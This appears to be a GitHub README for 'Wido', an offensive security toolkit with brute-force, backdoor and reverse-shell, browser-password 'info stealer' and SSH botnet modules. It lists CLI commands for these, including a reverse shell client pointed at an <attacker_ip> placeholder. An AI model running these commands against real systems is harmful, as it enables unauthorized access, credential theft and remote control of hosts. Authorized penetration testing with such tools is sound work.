# 🛡️ Wido — Offensive Security Toolkit

<p align="left">
  <img src="https://img.shields.io/badge/Python-3.7+-blue?style=for-the-badge&logo=python&logoColor=white"/>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20Mac-lightgrey?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Type-Offensive%20Security-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Mode-Interactive%20%7C%20CLI-green?style=for-the-badge"/>
  <img src="https://img.shields.io/github/stars/Anil-kumar78/wido-push?style=for-the-badge&color=yellow"/>
</p>

**Wido** is a powerful, all-in-one offensive security toolkit built for ethical hackers,
penetration testers, and cybersecurity professionals.
Features a **fully interactive numbered menu** — just run and choose!

---

## ⚠️ Disclaimer

> **This tool is intended for educational purposes and authorized penetration testing ONLY.**
> Unauthorized use against systems you do not own or have explicit permission to test is **illegal**.
> The author is **not responsible** for any misuse or damage caused by this tool.

---

## 🚀 Quick Start

```bash
# 1. Clone the repository
git clone https://github.com/Anil-kumar78/wido-push.git
cd wido-push

# 2. Install dependencies
pip install -r requirements.txt
pip install paramiko pyperclip psutil PyPDF2 rich

# 3. Launch — Interactive Menu
python wido.py
```

---

## 🎯 Interactive Menu Mode

Run `python wido.py` with **no arguments** to launch the interactive menu:

```
  ____  _            _
 |  _ \| |          | |
 | |_) | | __ _  ___| | ___   _
 |  _ <| |/ _` |/ __| |/ / | | |
 | |_) | | (_| | (__|   <| |_| |
 |____/|_|\__,_|\___|_|\_\__,  |
                          |___/

  [*] Blacky -- Offensive Security Toolkit
  [!] For authorized penetration testing only!
  --------------------------------------------------

  ╔══════════════════════════════════════════════════╗
  ║           SELECT A MODULE TO RUN                 ║
  ╚══════════════════════════════════════════════════╝

  [ SCANNING ]
    [ 1]  Port Scanner
    [10]  Subdomain Finder
    [11]  Alive Subdomain Checker
    [14]  Network Scanner

  [ BRUTE FORCE ]
    [ 2]  Hash Cracker
    [ 3]  SSH Brute-force
    [ 4]  FTP Brute-force

  [ BACKDOOR ]
    [ 5]  Backdoor Shell Server
    [ 6]  Backdoor Shell Client
    [15]  Reverse Shell Server
    [16]  Reverse Shell Client

  [ INTELLIGENCE ]
    [ 7]  Info Stealer
    [ 8]  SSH Botnet
    [ 9]  Vulnerability Scanner

  [ PDF TOOLS ]
    [12]  PDF Protection
    [13]  PDF Cracker

  [ 0 ]  Exit

  Enter module number: _
```

### How It Works
1. Run `python wido.py` → interactive menu launches automatically
2. Type a number (e.g. `1`) → module is selected
3. Enter inputs one by one (target IP, ports, wordlist, etc.)
4. Task executes automatically
5. Press **Enter** → return to menu &nbsp;|&nbsp; Type **`q`** → quit

---

## 🛠️ All Modules

| # | Module | Category | Description |
|---|--------|----------|-------------|
| 1 | 🔍 Port Scanner | Scanning | Scan open ports on a target |
| 2 | 🔑 Hash Cracker | Brute Force | Crack MD5/SHA hashes using wordlists |
| 3 | 🔐 SSH Brute-force | Brute Force | Brute-force SSH login credentials |
| 4 | 📂 FTP Brute-force | Brute Force | Brute-force FTP login credentials |
| 5 | 🚪 Backdoor Shell Server | Backdoor | Start a backdoor shell server |
| 6 | 🚪 Backdoor Shell Client | Backdoor | Connect to a backdoor shell server |
| 7 | 🕵️ Info Stealer | Intelligence | Clipboard, system info, Chrome passwords |
| 8 | 🤖 SSH Botnet | Intelligence | Run commands on multiple SSH hosts |
| 9 | 🛡️ Vulnerability Scanner | Intelligence | Scan code/paths for vulnerabilities |
| 10 | 🌐 Subdomain Finder | Scanning | Discover subdomains of a target domain |
| 11 | ✅ Alive Subdomain Checker | Scanning | Check which subdomains are alive |
| 12 | 🔒 PDF Protection | PDF Tools | Add password protection to a PDF |
| 13 | 🔓 PDF Cracker | PDF Tools | Crack PDF password using wordlist |
| 14 | 📡 Network Scanner | Scanning | Ping sweep to discover live hosts |
| 15 | 🔄 Reverse Shell Server | Backdoor | Start a reverse shell listener |
| 16 | 🔄 Reverse Shell Client | Backdoor | Connect back to reverse shell server |

---

## 💻 CLI Mode (For Scripting & Automation)

You can also pass arguments directly for scripting:

```bash
# Port Scanner
python wido.py port-scan --target 192.168.1.1 --ports 22,80,443 --workers 200

# Hash Cracker
python wido.py hash-crack --hashes hashes.txt --wordlist rockyou.txt

# SSH Brute-force
python wido.py ssh-brute --host 192.168.1.2 --user root --wordlist pass.txt

# FTP Brute-force
python wido.py ftp-brute --host 192.168.1.3 --user admin --wordlist pass.txt

# Info Stealer
python wido.py info-stealer

# SSH Botnet
python wido.py ssh-botnet --hosts hosts.txt --command "whoami" --user root --password pass

# Vulnerability Scanner
python wido.py vuln-scan --path ./myproject

# Subdomain Finder
python wido.py subdomain --domain example.com

# Alive Subdomains
python wido.py alive-subdomains --input subdomains.txt --output alive.txt

# PDF Protection
python wido.py pdf-protect --input file.pdf --output protected.pdf --password secret

# PDF Cracker
python wido.py pdf-crack --input protected.pdf --wordlist words.txt

# Network Scanner
python wido.py network-scan --subnet 192.168.1.0/24

# Reverse Shell Server
python wido.py backdoor-reverse-server --port 4444

# Reverse Shell Client
python wido.py backdoor-reverse-client --host <attacker_ip> --port 4444
```

---

## 📁 Project Structure

```
wido/
├── wido.py               # Main entry point (interactive menu + CLI)
├── scanner.py            # Vulnerability & subdomain scanner
├── security_checks.py    # Security check patterns for vuln-scan
├── subdomain_finder.py   # Subdomain discovery module
├── alive_subdomain.py    # Alive subdomain checker
├── config.json           # Configuration file
├── requirements.txt      # Python dependencies
└── README.md             # Project documentation
```

---

## ⚙️ Requirements

- **Python 3.7+**

```bash
pip install paramiko pyperclip psutil PyPDF2 rich
```

| Library | Purpose |
|---------|---------|
| `paramiko` | SSH features (brute-force, botnet) |
| `pyperclip` | Clipboard access in info-stealer |
| `psutil` | System info in info-stealer |
| `PyPDF2` | PDF protect & crack features |
| `rich` | Beautiful terminal output for vuln-scan |

---

## 🤝 Contributing

Contributions are welcome! Feel free to:
- 🐛 Submit bug reports via [Issues](https://github.com/Anil-kumar78/wido-push/issues)
- 💡 Request new features
- 🔀 Open a Pull Request

---

## 👨‍💻 Author

**Anil Kumar**
- GitHub: [@Anil-kumar78](https://github.com/Anil-kumar78)

---

<p align="center">Made with ❤️ for the cybersecurity community</p>
<p align="center">⭐ Star this repo if you find it useful!</p>
